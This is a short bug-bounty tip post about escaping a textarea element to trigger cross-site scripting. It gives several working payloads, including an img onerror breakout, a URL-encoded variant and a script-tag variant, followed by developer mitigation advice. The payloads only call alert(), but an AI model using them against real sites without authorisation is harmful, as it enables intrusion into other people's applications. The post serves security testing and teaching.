## 📌 XSS Tip – Escaping Out of `<textarea>` Tag
![XSS Tip – Escaping Out of textarea Tag - cybersecplayground](https://github.com/user-attachments/assets/85c8ca73-2f18-4595-9173-90e91807f03e)

### 🧪 Context-Aware Payload for Bypassing Input Filters

#### 🧠 Problem:

Many applications render user input inside a `<textarea>` element — often for user comments, descriptions, notes, etc.

Basic XSS payloads like:

```html
<img src=x onerror=alert(1)>
```

won’t work in this case because everything inside a `<textarea>` is treated as plain text — not parsed as HTML.

---

### ✅ Working Payload:

```html
</textarea><img src=x onerror=alert()>
```

#### 🔍 Why it works:

* Closes the existing `<textarea>` tag.
* Injects a valid HTML element (`<img>`) with an `onerror` JavaScript event.
* The browser now parses the payload as HTML → XSS is triggered!

---

### 🧪 How to Test:

1. Locate a user input field that is rendered inside a `<textarea>`.
2. Submit the payload:

```html
</textarea><img src=x onerror=alert()>
```

3. View the rendered HTML. If unfiltered, an alert box should pop.

---

### 🧪 Payload Variants:

1. **URL-encoded:**

```
%3C%2Ftextarea%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

2. **With `<script>` tag:**

```html
</textarea><script>alert(1)</script>
```

---

### 🛡 Developer Mitigation:

* Always escape user input correctly in all HTML contexts.
* Specifically escape `</textarea>` if outputting into a `<textarea>` tag.
* Use libraries like **DOMPurify** for client-side sanitization.
* Avoid rendering user content directly into the DOM unless sanitized.

---

📢 Stay up-to-date with bug bounty tips, real payloads, and exploitation tricks — follow **[@cybersecplayground](https://t.me/cybersecplayground)**.

\#bugbounty #xss #cybersecurity #textarea #htmlinjection #websecurity #infosec #cybersecplayground
